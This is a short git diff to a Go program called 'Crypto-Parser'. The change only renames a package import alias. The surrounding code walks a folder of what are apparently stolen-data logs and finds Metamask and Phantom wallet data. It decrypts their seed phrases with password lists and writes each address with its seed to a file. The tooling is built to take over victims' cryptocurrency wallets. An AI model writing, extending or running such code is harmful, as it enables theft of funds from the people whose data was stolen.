@@ -14,7 +14,7 @@ import (
 	"github.com/joho/godotenv"
 
 	"Crypto-Parser/tools"
-	wallet "Crypto-Parser/wallets"
+	"Crypto-Parser/wallets"
 	"Crypto-Parser/wallets/metamask"
 	"Crypto-Parser/wallets/phantom"
 )
@@ -103,7 +103,7 @@ func extractWalletMnemonics(logsPath string) {
 		for _, walletFolder := range walletsDir {
 			if strings.Contains(walletFolder.Name(), "Metamask") {
 				mnemonic, err := metamask.GetMnemonic(filepath.Join(walletsFolderPath, walletFolder.Name()), passwords)
-				addr := wallet.AddrFromSeed(mnemonic)
+				addr := wallets.AddrFromSeed(mnemonic)
 				if err != nil {
 					continue
 				}
@@ -114,7 +114,7 @@ func extractWalletMnemonics(logsPath string) {
 				seedFile.WriteString(fmt.Sprintf("Adress: %s | Seed: %s\n", addr, mnemonic))
 			} else if strings.Contains(walletFolder.Name(), "Phantom") {
 				mnemonic, err := phantom.GetMnemonic(filepath.Join(walletsFolderPath, walletFolder.Name()), passwords)
-				addr := wallet.AddrFromSeed(mnemonic)
+				addr := wallets.AddrFromSeed(mnemonic)
 				if err != nil {
 					continue
 				}
